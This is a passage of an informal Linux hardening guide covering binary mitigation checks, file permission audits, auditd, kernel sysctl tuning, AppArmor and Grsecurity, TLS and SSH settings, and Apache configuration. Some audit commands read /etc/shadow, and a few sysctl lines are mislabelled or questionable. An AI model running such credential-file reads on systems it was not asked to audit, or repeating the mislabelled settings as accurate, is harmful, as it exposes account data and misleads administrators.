&lt;pre&gt;
shawn@shawn-fortress ~ $ readelf -l a.out | grep GNU_RELRO 
  GNU_RELRO      0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 

Check elf's dynamic sections to find fully-RELRO: 
shawn@shawn-fortress ~ $ readelf -d a.out | grep BIND_NOW 
 0x0000000000000018 (BIND_NOW)
&lt;/pre&gt;

&lt;p&gt;*) PIE&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Position-independent_code&quot;&gt;PIE&lt;/a&gt; enforces every process’s code segment is mmap()’d, it begins at a
different base address at each execution of the application.&lt;/p&gt;

&lt;p&gt;Note: mmap()’ is always used no matter what the type of the executable
is (PIE vs. non-PIE). For non-PIE binaries the kernel uses an internal
flag equivalent to MMAP_FIXED when mapping program headers.&lt;/p&gt;

&lt;p&gt;GCC option: -pie, it only work for sec mitigation when kernel enables
ASLR.&lt;/p&gt;
&lt;pre&gt;
no PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*EXEC&quot; 
  Type:                              EXEC (Executable file) 

PIE: 
shawn@shawn-fortress ~ $ readelf -h a.out | grep &quot;Type:[[:space:]]*DYN&quot; 
  Type:                              DYN (Shared object file)
&lt;/pre&gt;

&lt;p&gt;These exploit mitigations provided by GCC will definitely increase the
cost of attackers. We all did believed so…until shit happened( as
always?). Hector Marco &lt;a href=&quot;http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html&quot;&gt;released a method&lt;/a&gt; that can bypass NX/ASLR/PIE/CANARY mitigations locally/remotely
easily. After these years of debating and bragging about how secure of
GNU/Linux is/was and we finally ended up in*One mem infoleak can rule
the fuc*ing GNU/Linux*!!! Damn, PaX/Grsecurity will be our last hope
again, like a decade ago………..&lt;/p&gt;

&lt;h3 id=&quot;ld-sch00l-nix-file-auditing&quot;&gt;—-[ 2.2 0ld sch00l *nix file auditing&lt;/h3&gt;

&lt;p&gt;There are a bunch of files that could be exploited by attackers in the
specific scene. Fortunately, FOSS( Free &amp;amp; Open Source) community is
providing a lot of methods for the security audit work. They should be
a defender’s daily bread, which being part of defense-in-depth model.&lt;/p&gt;

&lt;p&gt;WildCards is a powerful feature in UNIX-like platform, but it can be
&lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;exploited&lt;/a&gt; by attackers:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune  -name &quot;-*&quot;&lt;/pre&gt;

&lt;p&gt;World-writable file audit:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -perm -2 ! -type l -ls&lt;/pre&gt;

&lt;p&gt;World-readable file audit, correct permission: chmod 640 /var/log/:&lt;/p&gt;

&lt;pre&gt;find /var/log -perm -o=r ! -type l&lt;/pre&gt;

&lt;p&gt;Check if files were orphange:&lt;/p&gt;

&lt;pre&gt;find / -path /proc -prune -o -nouser -o -nogroup&lt;/pre&gt;

&lt;p&gt;List avaiable users, be cautions about who’s the “user”:&lt;/p&gt;
&lt;pre&gt;egrep -v '.*:\*|:\!' /etc/shadow | awk -F: '{print $1}'&lt;/pre&gt;

&lt;p&gt;Check which files belong to whom. Then delete the user correctly:&lt;/p&gt;

&lt;pre&gt;userdel -r account&lt;/pre&gt;

&lt;pre&gt;find / -path /proc -prune -o -user account -ls&lt;/pre&gt;

&lt;p&gt;List which users are unavailable:&lt;/p&gt;

&lt;pre&gt;grep -v ':x:' /etc/passwd&lt;/pre&gt;

&lt;p&gt;List expired passwords:&lt;/p&gt;

&lt;pre&gt;cat /etc/shadow | cut -d: -f 1,2 | grep '!'&lt;/pre&gt;

&lt;p&gt;The correct permission should be 644 at least. 600 would be better:&lt;/p&gt;

&lt;pre&gt;ls -l /boot&lt;/pre&gt;

&lt;p&gt;Files with suid or sgid flags:&lt;/p&gt;

&lt;pre&gt;find / -xdev -user root \( -perm -4000 -o -perm -2000 \)&lt;/pre&gt;

&lt;p&gt;Check if some stupid mistakes has been made( Thanks to Tim Brown):&lt;/p&gt;

&lt;pre&gt;objdump -x $i | grep -i path&lt;/pre&gt;

&lt;p&gt;Note: The main stream GNU/Linux distro( Debian, Gentoo, OpenSUSE,
CentOS) won’t have big chance to do stupid things, but it’s worth to
look at GNU/Linux platform with 3-rd party applications. Some
commercial applications may do something stuipid like this one:&lt;/p&gt;

&lt;p&gt;http://lists.openwall.net/bugtraq/2014/06/04/5&lt;/p&gt;

&lt;p&gt;—-[ 2.3 GNU/Linux’s auditd&lt;/p&gt;

&lt;p&gt;One particular scene is that some m41wares( or human attackers) might
be interested in change some file’s metadata for some *interesting*
reasons and then change it back to the original. Let’s show time:&lt;/p&gt;

&lt;p&gt;Install auditd and make sure its on boot startup:&lt;/p&gt;
&lt;pre&gt;#apt-get install auditd
#update-rc.d auditd enable&lt;/pre&gt;

&lt;p&gt;Config file:&lt;/p&gt;

&lt;pre&gt;/etc/audit/auditd.conf&lt;/pre&gt;

&lt;p&gt;Store log file:&lt;/p&gt;

&lt;pre&gt;log_file = /var/log/audit/audit.log&lt;/pre&gt;

&lt;p&gt;Add one policy to /etc/audit/audit.rules:&lt;/p&gt;

&lt;pre&gt;-w /home/shawn/change-test -p wa -k  identify&lt;/pre&gt;

&lt;p&gt;Use this test program to change the permission：&lt;/p&gt;

&lt;h1 id=&quot;include-stdioh&quot;&gt;include &amp;lt;stdio.h&amp;gt;&lt;/h1&gt;
&lt;p&gt;#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;

&lt;p&gt;int main(int argc, char *argv[])
{
	struct stat sb;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if( stat(argv[1], &amp;amp;sb) == -1){
    perror(&quot;stat&quot;);
	exit(EXIT_FAILURE);
	}

	if( chmod(argv[1], sb.st_mode) == -1)
	{
		perror(&quot;stat&quot;);
			exit(EXIT_FAILURE);
			}
			return ; }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;
shawn@shawn-fortress ~ $ gcc change.c
shawn@shawn-fortress ~ $ touch change-test
shawn@shawn-fortress ~ $ ./a.out change-test
&lt;/pre&gt;

&lt;p&gt;The date of  “Modify” and “Change” should be different:
shawn@shawn-fortress ~ $ stat change-test&lt;/p&gt;

&lt;p&gt;Check *who* did it:&lt;/p&gt;

&lt;p&gt;shawn@shawn-fortress ~ $ ausearch -i -k identify&lt;/p&gt;

&lt;h3 id=&quot;t00ls&quot;&gt;—-[ 2.4 T00ls&lt;/h3&gt;

&lt;p&gt;NMAP/OpenVAS/lynis/rkhunter/chkrootkit/metasploit/volatality/etc&lt;/p&gt;

&lt;p&gt;–[ 3. Kernel security&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anti-DoS related:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;** SYN cookies is a syn flood attack protection, the default is enable( 1)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.tcp_syncookies = 1
/proc/sys/net/ipv4/tcp_syncookies

(optional)，if your kernel support SYNPROXY：
iptables -t raw -A PREROUTING -i eth0 -p tcp --dport 80 --syn -j NOTRACK
iptables -A INPUT -i eth0 -p tcp --dport 80 -m state UNTRACKED,INVALID \
	 -j SYNPROXY --sack-perm --timestamp --mss 1480 --wscale 7 --ecn

echo 0 &amp;gt; /proc/sys/net/netfilter/nf_conntrack_tcp_loose

Note: SYNPROXY has been added into vanilla kernel in 3.13.
&lt;/pre&gt;

&lt;p&gt;** TCP FIN-WAIT-2 status lifetime, it’d be an DoS attack risk if
the value is too big. It’d be cause remote machine doesn’t have enough
time to close the connection if the value is too small. Default is 60(
seconds). 15 is better, you think? &lt;a href=&quot;http://benohead.com/tcp-about-fin_wait_2-time_wait-and-close_wait/&quot;&gt;Further reading&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_fin_timeout = 15
/proc/sys/net/ipv4/tcp_fin_timeout
&lt;/pre&gt;

&lt;p&gt;** SYN queue length, the bigger value can handle more connections, the
  default is 1024:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_syn_backlog = 8192
/proc/sys/net/ipv4/tcp_max_syn_backlog
&lt;/pre&gt;

&lt;p&gt;** Device queue length, this value should be bigger than syn queue?
   The default is 1000&lt;/p&gt;

&lt;pre&gt;
net.core.netdev_max_backlog = 16384
/proc/sys/net/core/netdev_max_backlog
&lt;/pre&gt;

&lt;p&gt;** listen()’s backlog, the default is 128:&lt;/p&gt;

&lt;pre&gt;
net.core.somaxconn = 4096
/proc/sys/net/core/somaxconn
&lt;/pre&gt;

&lt;p&gt;** TIME_WAIT status TCP connections, the system will empty the
   connection if the number is exceed the value,&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_tw_buckets = 65535
/proc/sys/net/ipv4/tcp_max_tw_buckets
&lt;/pre&gt;

&lt;p&gt;** TIME-WAIT status can be reuse, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_reuse = 1
/proc/sys/net/ipv4/tcp_tw_reuse
&lt;/pre&gt;

&lt;p&gt;** fast recycle of TIME-WAIT status connection, the default is disable( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_tw_recycle = 1
/proc/sys/net/ipv4/tcp_tw_recycle
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe frequency,the default is 7,200 seconds:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_time = 300
/proc/sys/net/ipv4/tcp_keepalive_time
&lt;/pre&gt;

&lt;p&gt;** TCP KEEPALIVE probe packets, the default is 9:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_keepalive_probes = 3
/proc/sys/net/ipv4/tcp_keepalive_probes
&lt;/pre&gt;

&lt;p&gt;** how many times of SYN and SYN+ACK can be re-transimit, the default is 5:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_syn_retries = 3
/proc/sys/net/ipv4/tcp_syn_retries

net.ipv4.tcp_synack_retries = 3 
/proc/sys/net/ipv4/tcp_synack_retries
&lt;/pre&gt;

&lt;p&gt;** the bigger value of TCP ORPHAN would prevent simple DoS attack,
   each ORPHAN cost 64KB memory, so 65535 is about 4GB:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_max_orphans = 65536
/proc/sys/net/ipv4/tcp_max_orphans
&lt;/pre&gt;

&lt;p&gt;** How many pages( 4KB each page in x86) can be used in TCP connection:&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_mem = 131072 196608 262144
/proc/sys/net/ipv4/tcp_mem
&lt;/pre&gt;

&lt;p&gt;Be careful about this one, it’d be triggered OOM if the TCP connection
consume all pages.&lt;/p&gt;

&lt;p&gt;** The maximum send and receive window, you can set 64MB for a 10G NIC:&lt;/p&gt;

&lt;pre&gt;
net.core.rmem_max = 67108864
/proc/sys/net/core/rmem_max

net.core.wmem_max = 67108864
/proc/sys/net/core/wmem_max
&lt;/pre&gt;

&lt;p&gt;** Each TCP connection’s read buffer( X bytes):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.tcp_rmem = 4096 8192 16777216( 4096 87380 33554432)
/proc/sys/net/ipv4/tcp_rmem

net.ipv4.tcp_wmem = 4096 8192 16777216( 4096 65536 33554432)
/proc/sys/net/ipv4/tcp_wmem
&lt;/pre&gt;

&lt;p&gt;If default paging 8kb * 2 = 16kb/connection, 4GB memory can be used for:
(4 * 1024 * 1024) / 16 = 262144&lt;/p&gt;

&lt;p&gt;Oracle DB server’s &lt;a href=&quot;http://www.dba-oracle.com/t_linux_networking_kernel_parameters.htm&quot;&gt;best practice&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Networking&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ref:
https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html&lt;/p&gt;

&lt;p&gt;** Source Routing is used to specify a path or route through the
network from source to destination. This feature can be used by
network people for diagnosing problems. However, if an intruder was
able to send a source routed packet into the network, then he could
intercept the replies and your server might not know that it’s not
communicating with a trusted server.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_source_route = 0
/proc/sys/net/ipv4/conf/all/accept_source_route
&lt;/pre&gt;

&lt;p&gt;** ICMP redirects are used by routers to tell the server that there is
   a better path to other networks than the one chosen by the
   server. However, an intruder could potentially use ICMP redirect
   packets to alter the hosts’s routing table by causing traffic to
   use a path you didn’t intend.&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.accept_redirects = 0
/proc/sys/net/ipv4/conf/all/accept_redirects
&lt;/pre&gt;

&lt;p&gt;** Turn it off if this is not a router：&lt;/p&gt;

&lt;pre&gt;
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

/proc/sys/net/ipv4/conf/all/send_redirects
/proc/sys/net/ipv4/conf/default/send_redirects
&lt;/pre&gt;

&lt;p&gt;** IP spoofing protection, the default is disabled( 0)：&lt;/p&gt;
&lt;pre&gt;
net.ipv4.conf.all.rp_filter = 1
/proc/sys/net/ipv4/conf/all/rp_filter
&lt;/pre&gt;

&lt;p&gt;** If you want to ignore all ICMP package, you can enable it. The
   default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_all = 1
/proc/sys/net/ipv4/icmp_echo_ignore_all
&lt;/pre&gt;

&lt;p&gt;** Ignore ICMP broadcast, the default is enabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_echo_ignore_broadcasts = 1
/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
&lt;/pre&gt;

&lt;p&gt;** To alert you about bad message, the default is disabled( 1):&lt;/p&gt;

&lt;pre&gt;
net.ipv4.icmp_ignore_bogus_error_responses = 1
/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses
&lt;/pre&gt;

&lt;p&gt;** To turn on logging for Spoofed Packets, Source Routed Packets, and
   Redirect Packets, the default is disabled( 0):&lt;/p&gt;

&lt;pre&gt;
/proc/sys/net/ipv4/conf/all/log_martians
net.ipv4.conf.all.log_martians = 1
&lt;/pre&gt;

&lt;h2 id=&quot;exploit-mitigation&quot;&gt;Exploit mitigation&lt;/h2&gt;
&lt;p&gt;** Randomize the memory area. 0: disable ASLR. 1: Randomize the stack,
   VDSO page, shared memory regions. 2: (1) + also randomize the data
   segment.&lt;/p&gt;

&lt;pre&gt;
kernel.randomize_va_space=2
/proc/sys/kernel/randomize_va_space
&lt;/pre&gt;

&lt;p&gt;** Not allow the user to read kernel address symbol tables:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/kptr_restrict
&lt;/pre&gt;

&lt;p&gt;** dmesg info can be read by root-only:&lt;/p&gt;
&lt;pre&gt;
kernel.kptr_restrict=1
/proc/sys/kernel/dmesg_restrict
&lt;/pre&gt;

&lt;p&gt;** the minimal memory map address, 65536 is good at least:&lt;/p&gt;
&lt;pre&gt;
vm.mmap_min_addr=65536
/proc/sys/vm/mmap_min_addr
&lt;/pre&gt;

&lt;p&gt;** Now allow the debugger trace the process by ptrace. The current
   Debian stable kernel doesn’t have this feature. 0: All process can
   be debugged. 1: Only one father process can be debugged. 2: Only
   &lt;em&gt;root&lt;/em&gt; can do debug( with CAP_SYS_PTRACE) 3: no process can be
   debugged&lt;/p&gt;
&lt;pre&gt;
kernel.yama.ptrace_scope = 2
/proc/sys/kernel/yama/ptrace_scope
&lt;/pre&gt;

&lt;h3 id=&quot;apparmor&quot;&gt;—-[ 3.1 Apparmor&lt;/h3&gt;

&lt;p&gt;Why Apparmor? It’s easy to deploy. More importantly, it’s easy to
audit the polices. Everyone can write your own MAC/RBAC
policy. Debian/OpenSuSE shipped with Apparmor by default.&lt;/p&gt;

&lt;p&gt;Install Apparmor and MAC polices from community:
#apt-get install -y apparmor-profiles apparmor&lt;/p&gt;

&lt;p&gt;Check the status:
#aa-status&lt;/p&gt;

&lt;h3 id=&quot;selinux&quot;&gt;—-[ 3.2 SELinux&lt;/h3&gt;

&lt;p&gt;S0rry. I barely use SELinux for reasons. The 1st one is I don’t trust
NSA, even the source code is GPL’ed. NSA is professional about
&lt;em&gt;implant&lt;/em&gt; backdoors, which would be very hard to audit. People has
been discussing it for years:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;NSA SELinux&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA has inserted its code into Android&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;NSA linux/android kernel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sebastian Krahmer found a &lt;a href=&quot;https://github.com/stealth/troubleshooter&quot;&gt;exploitable bug&lt;/a&gt; from SELinux recently. It looks like a backdoor more than a “vulnerablity”, isn’t it?;-)
Another important reason people don’t like SELinux because it’s hard
to use and cause other application troubles from time to time. &lt;a href=&quot;http://stopdisablingselinux.com/&quot;&gt;Stop
disabling SELinux&lt;/a&gt; movement won’t work in the near future:&lt;/p&gt;

&lt;p&gt;S0rry, Mr.Walsh. It’s nothing personal:-)&lt;/p&gt;

&lt;h3 id=&quot;mempo-kernel&quot;&gt;—-[ 3.3 Mempo kernel&lt;/h3&gt;

&lt;p&gt;”“⌘ Mempo project aims to provide most secure and yet comfortable
out-of-the-box Desktop and Server computer, for professionals,
business, journalists, and every-day users avoiding PRISM-like
spying. ⌘”&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://wiki.debian.org/Mempo&quot;&gt;Mempo&lt;/a&gt; is a FLOSS project for protect user’s digital freedom. Let the
massive surveillance cry;-)&lt;/p&gt;

&lt;p&gt;The Debian Mempo repo is not working for the internet user now and
it’ll be back soon. So I’ll write how to use PaX/Grsecurity from
offical Mempo repository on Debian.&lt;/p&gt;

&lt;h3 id=&quot;paxgrsecurity&quot;&gt;—-[ 3.3.1 PaX/Grsecurity&lt;/h3&gt;

&lt;p&gt;PaX/Grsecurity is the cutting-edge kernel protection in past 14
years. But they don’t have the credit what they supposed to
have. Almost every main stream OS kernel security mechanism has
influenced by PaX/Grsecurity in past decade. Lionel tells a &lt;a href=&quot;http://www.openwall.com/lists/oss-security/2014/12/06/14&quot;&gt;little story&lt;/a&gt; about PaX/Grsecurity better than myself:&lt;/p&gt;

&lt;p&gt;PaX/Grsecurity treat the kernel security as a whole. They’ve been
inventing many innovations( SEGMEXEC, PAGEEXEC, MPROTECT, UDEREF,
RANDSTRUCT&lt;em&gt;, etc), while hardening the kernel in source code level(
make important *struct&lt;/em&gt; read-only, etc). PaX/Grsecurity is one of most
respected 0ld sch00l hacker community. The main contributor( Spender)
was even been through a &lt;a href=&quot;http://developers.slashdot.org/story/04/05/31/1949241/end-of-development-for-grsecurity-announced&quot;&gt;very badly economic situation&lt;/a&gt; back in 2004&lt;/p&gt;

&lt;p&gt;Thanks to the G0d of techn0logy, PaX/Grsecurity is still alive…. I
personally agree with some ideas:&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;“The “better than none” point of view is actually a nice way to false
sense of security for those who don’t know better. We got
better-than-none apparmor, selinux, tomoyo, some poorly maintained and
crippled ports of grsec features or alikes, namespaces and containers,
rootkit-friendly LSM, the dumb and useless kernel version of SSP,
etc. What’s the sum of all this shit for end users? False sense of
security…”&lt;/p&gt;

&lt;p&gt;“without Grsecurity/PaX, linux security is like monkey can never
perform a regular masturbation cu’z lacking of giant pennis;-)”
———————————————————————–&lt;/p&gt;

&lt;p&gt;Too many better-than-none product or solutions, which only makes you
feel safe, maybe for a while. Feel safe is not equal to
secure. Fuc*ing cargo cult shitty security only makes things worse.&lt;/p&gt;

&lt;p&gt;I’ll show you how to install PaX/Grsecurity manually( still waiting
Mempo back online):&lt;/p&gt;

&lt;p&gt;** &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v3.x/&quot;&gt;Download kernel&lt;/a&gt; ( Pick one)：
https://www.kernel.org/pub/linux/kernel/v3.x/&lt;/p&gt;

&lt;p&gt;** Download &lt;a href=&quot;https://grsecurity.net/download.php&quot;&gt;PaX/Grsecurity patch&lt;/a&gt; ( you can download the latest version
   from )：&lt;/p&gt;

&lt;p&gt;** Decompress the kernel and patch the kernel with grsecurity:&lt;/p&gt;
&lt;pre&gt;
xz -d linux-*.tar.xz
tar xvf linux-*.tar
cd linux-*/
patch -p1 &amp;lt; ../grsecurity-*.patch
&lt;/pre&gt;

&lt;p&gt;** Do “make menuconfig” to customize your kernel, or you can use &lt;a href=&quot;https://raw.githubusercontent.com/citypw/citypw-SCFE/master/security/apparmor_test/debian-7.4-linux-3.14.1-grsec.config&quot;&gt;my test config&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;** Compile&lt;/p&gt;
&lt;pre&gt;
make -j7 deb-pkg
&lt;/pre&gt;

&lt;p&gt;** Install the new kernel&lt;/p&gt;
&lt;pre&gt;
dpkg -i ../*.deb
&lt;/pre&gt;

&lt;h2 id=&quot;crypto&quot;&gt;–[ 4. Crypto&lt;/h2&gt;

&lt;p&gt;“Encryption works. Properly implemented strong crypto systems are one
of the few things that you can rely on. Unfortunately, endpoint
security is so terrifically weak that NSA can frequently find ways
around it.”   — Edward Snowden&lt;/p&gt;

&lt;p&gt;Damn, we should treat the crypto engineering very carefully. Because
it may be the last outter-heaven we have;-)&lt;/p&gt;

&lt;p&gt;—-[ 4.1 SSL/TLS Checklist&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.exploresecurity.com/wp-content/uploads/custom/SSL_manual_cheatsheet.html&quot;&gt;Very good writing&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SSL/TLS has been through BEAST/CRIME/LUCKY-13/HEARTBLEED/POODLE in
past few years. and it’s already become one of hottest topic in cyber
security. There are a set of vulnerable protocols and ciphersuites are
worth to do audit. There are a few open source tools would make your
audit work easier. Try this one:&lt;/p&gt;

&lt;pre&gt;
#apt-get install sslscan


SSLv2 should be disabled:
openssl s_client -ssl2 -connect www.google.com:443

OpenSSL 1.0 no longer support SSLv2. So you can use GnuTLS do the
check:

gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com
&lt;/pre&gt;

&lt;p&gt;FREAK:&lt;/p&gt;
&lt;pre&gt;
openssl s_client -cipher EXPORT -connect www.google.com:443
&lt;/pre&gt;

&lt;p&gt;If succeed, it’s risk to FREAK.&lt;/p&gt;

&lt;p&gt;—-[ 4.2 OpenSSH&lt;/p&gt;

&lt;p&gt;Config file：/etc/ssh/ssh_config&lt;/p&gt;

&lt;pre&gt;
1, known_hosts stores server's signature, so hash the host name:

HashKnownHosts yes

2, SSH protocl version 1 is not secure:

Protocol 2

3, If you don't use X11 forwarding, plz disable it&quot;

X11Forwarding no

4, Disable rhosts:

IgnoreRhosts yes

5, Not allow empty password:

PermitEmptyPasswords no

6, Maxisum tries:

MaxAuthTries 5

7, Now allow root login:

PermitRootLogin no


(Optional)
1, disable password auth, enable pubkey auth:

PubkeyAuthentication yes

PasswordAuthentication no


2，Allow or deny users/groups

AllowGroups, AllowUsers, DenyUsers, DenyGroups
&lt;/pre&gt;

&lt;h3 id=&quot;openssh-in-post-prism-era&quot;&gt;——[ 4.2.1 OpenSSH in post-prism era&lt;/h3&gt;

&lt;p&gt;Well, plz &lt;a href=&quot;https://stribika.github.io/2015/01/04/secure-secure-shell.html&quot;&gt;read this&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ciphersuites-in-apache2nginx&quot;&gt;—-[ 4.2 Ciphersuites in Apache2/Nginx&lt;/h3&gt;

&lt;p&gt;The explanation is &lt;a href=&quot;https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Apache:
SSLProtocol ALL -SSLv2 -SSLv3
SSLHonorCipherOrder On
SSLCipherSuite ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;Nginx:
ssl_prefer_server_ciphers On;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS&lt;/p&gt;

&lt;p&gt;–[ 5. Web security&lt;/p&gt;

&lt;p&gt;You’re not reading this article for learning pentest, are you? Let’s
just consider the fence of defender’s;-)&lt;/p&gt;

&lt;p&gt;OWASP code review:
https://www.owasp.org/images/2/2e/OWASP_Code_Review_Guide-V1_1.pdf
https://www.owasp.org/index.php/OWASP_Code_review_V2_Project&lt;/p&gt;

&lt;p&gt;OWASP testing guide:
https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf
https://www.owasp.org/index.php/OWASP_Guide_Project&lt;/p&gt;

&lt;p&gt;—-[ 5.1 Web server( Apache/Nginx ?)&lt;/p&gt;

&lt;p&gt;ServerRoot&lt;/p&gt;
&lt;pre&gt;
Web server's root path. Default is &quot;/etc/httpd&quot;. It's import to keep
track of its permission. Recommend: Do not allow none-root user has
the permission to modify it.

chown root:root /etc/httpd
chmod 754 /etc/httpd
&lt;/pre&gt;

&lt;p&gt;Timeout&lt;/p&gt;
&lt;pre&gt;
Lifetime per session. Default is 60 seconds. Set the lower value for
mitigating DoS attack. Recommend: 15 &amp;lt;= X &amp;lt;= 30
&lt;/pre&gt;

&lt;p&gt;KeepAlive&lt;/p&gt;
&lt;pre&gt;
Persistent session. Default is “Off”. Recommend: On
&lt;/pre&gt;

&lt;p&gt;User&lt;/p&gt;
&lt;pre&gt;
Decide which user Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Group&lt;/p&gt;
&lt;pre&gt;
Decide which group Apache work process running as. Recommend: nobody
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist IP/networks&lt;/p&gt;
&lt;pre&gt;
Order Deny,Allow
Deny from all
Allow from 176.16.0.0/16

Or by IP:

Order Deny,Allow
Deny from all
Allow from 127.0.0.1
&lt;/pre&gt;

&lt;p&gt;Blacklist/whitelist web contents&lt;/p&gt;
&lt;pre&gt;
It can prevent malicious attack via web content.

&amp;lt; Directory /&amp;gt;
Order Deny,Allow # Default is Allow
Deny from all  # Deny all contents
&amp;lt; /Directory&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Options FollowSymLinks&lt;/p&gt;
&lt;pre&gt;
Do not list any other files if the visited file don't exit.
&lt;/pre&gt;

&lt;p&gt;Hide info&lt;/p&gt;
&lt;pre&gt;
ServerSignature:
* Off, do not provide any information
* On, provide Apache infomation

ServerTokens:
* Full, exposure all information
* Prod, only provide server name
&lt;/pre&gt;

&lt;p&gt;Limit risky HTTP methods&lt;/p&gt;
&lt;pre&gt;
&amp;lt; Directory /&amp;gt;
&amp;lt; LimitExcept GET POST&amp;gt;
Deny from all
&amp;lt; /LimitExcept&amp;gt;
&amp;lt; /Directory&amp;gt;

PUT/DELETE/etc methods won't be available.
&lt;/pre&gt;

&lt;p&gt;MinSpareServers&lt;/p&gt;
&lt;pre&gt;
Minimal spare processes. Default is 5. Recommend: 32.
&lt;/pre&gt;

&lt;p&gt;MaxSpareServers&lt;/p&gt;
&lt;pre&gt;
Maximum spare processes. Default is 20. Recommend: 64.
&lt;/pre&gt;

&lt;p&gt;ServerLimit&lt;/p&gt;
&lt;pre&gt;
The number that MaxClients can't not exceed.
&lt;/pre&gt;

&lt;p&gt;MaxClients&lt;/p&gt;
&lt;pre&gt;
The maximum number of working processes. Default is 256. Recommend:
8192.

MaxClients = (RAM available to Apache) / (RAM per Apache process)

RAM per Apache process:
#ps -ylC httpd --sort:rss

Example:
64GB physical memory * 0.8 = RAM available to Apache
HTML &amp;lt;= 5MB per process, PHP &amp;lt;= 15MB per processe
php: MaxClients = 65536MB / 15MB =4369
&lt;/pre&gt;

&lt;p&gt;MaxRequestsPerChild&lt;/p&gt;
&lt;pre&gt;
Limit on the number of requests that an individual child server will
handle during its life. Default is 4000. Recommend: 1500.
&lt;/pre&gt;

&lt;p&gt;—-[ 5.2 WAF&lt;/p&gt;

&lt;p&gt;ModSecurity is an open source, cross-platform web application firewall
(WAF) module. Known as the “Swiss Army Knife” of WAFs, it enables web
application defenders to gain visibility into HTTP(S) traffic and
provides a power rules language and API to implement advanced
protections. The web malicious signatures( including OWASP Top 10) are
maintained by ModSecurity community. You can &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-set-up-mod_security-with-apache-on-debian-ubuntu&quot;&gt;deploy it on Debian&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Anti-DoS: &lt;a href=&quot;https://www.linode.com/docs/websites/apache-tips-and-tricks/modevasive-on-apache&quot;&gt;mod_evasive&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;About anti DoS solution, I personally don’t get used to
mod_evasive. Iptables would be much easier to maintain, eg:&lt;/p&gt;
&lt;pre&gt;
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp -m multiport --dports 80,443 -i eth0 -m state --state NEW -m recent --update --seconds 30 --hitcount 5 -j DROP
